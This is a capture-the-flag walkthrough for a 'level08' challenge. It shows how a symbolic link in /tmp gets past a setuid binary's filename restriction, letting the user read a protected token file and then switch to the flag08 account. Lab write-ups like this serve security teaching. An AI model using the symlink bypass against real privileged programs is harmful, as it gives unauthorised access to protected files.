# Level08

## Objective
Exploit the `level08` binary to read the contents of the `token` file, which is owned by `flag08`. Use symbolic links to bypass the restriction on the filename and obtain the flag for `level08`.

## Steps

### Step 1: Understand Binary and Permissions
Examine the permissions of the `level08` binary and its extended ACL:

```bash
ls -la level08
getfacl level08
```

Look for setuid and setgid permissions. Note that the binary is setuid (`s` in the owner's execute permission) and setgid (`s` in the group's execute permission).

### Step 2: Identify Target File
Check the size of the `token` file to see if it matches the flag size:

```bash
ls -l token
```

### Step 3: Create Symbolic Link
Create a symbolic link named `/tmp/file` pointing to `~/token`:

```bash
ln -s ~/token /tmp/file
```

### Step 4: Execute Binary
Run the `level08` binary with the symbolic link as a parameter:

```bash
./level08 /tmp/file
```

The binary should echo the contents of the `token` file.

### Step 5: Obtain Flag
The output of the binary should contain the flag for `level08`.

### Step 6: Switch to `flag08`
Attempt to switch to `flag08` and execute `getflag`:

```bash
su flag08
getflag
```

This should give you the flag for this level.

Congratulations! You've successfully exploited the `level08` binary to read the contents of the `token` file and obtain the flag for `level08`.